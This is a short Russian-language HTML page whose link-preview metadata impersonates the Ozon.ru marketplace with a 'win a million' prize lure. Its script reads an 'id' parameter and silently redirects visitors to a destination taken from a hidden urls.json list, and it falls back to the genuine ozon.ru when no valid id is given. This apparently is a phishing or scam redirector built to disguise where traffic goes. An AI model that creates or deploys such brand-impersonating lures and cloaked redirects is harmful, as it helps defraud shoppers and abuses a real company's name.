<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    
    <title>© 2026 Защищенное перенаправление трафика</title>

    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWrxB8FZVbsRP4ro-7lVqQjY6vsuRBf1TbfBSz96mVNDx6Np6HqevUn6dW&s=10">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="OZON.ru маркетплейс – миллионы товаров по выгодным...">
    <meta name="twitter:description" content="🏆 Стань миллионером с Ozon! Делай любимые покупки, выполняй задания и участвуй в розыгрыше главного приза. Твой шанс забрать миллион — всего в одном клике! 💸">
    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR4qr3cCQcwrg-ZNNfjoQCT34OZJdqH-6nr0R4g1gDQKO_4kPTKOAlRqEQ&s=10">


</head>
<body>
    <script>
        // Получаем параметр 'id' из URL (номер ссылки в массиве)
        const urlParams = new URLSearchParams(window.location.search);
        const linkIndex = urlParams.get('id');
        
        if (linkIndex !== null) {
            // Преобразуем в число
            const index = parseInt(linkIndex);
            
            // Загружаем urls.json
            fetch('urls.json')
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Проблемы с сетью интернет [ERROR_LF1])');
                    }
                    return response.json();
                })
                .then(data => {
                    // Проверяем, что data - это массив и индекс существует
                    if (Array.isArray(data) && data[index]) {
                        window.location.replace(data[index]);
                    } else {
                        console.error('Проблемы с сетью интернет [ERROR_LF2]');
                        window.location.replace('https://www.ozon.ru');
                    }
                })
                .catch(error => {
                    console.error('Ошибка:', error);
                    window.location.replace('https://www.ozon.ru');
                });
        } else {
            // Если параметр id отсутствует - на fallback
            window.location.replace('https://www.ozon.ru');
        }
    </script>
</body>
</html>
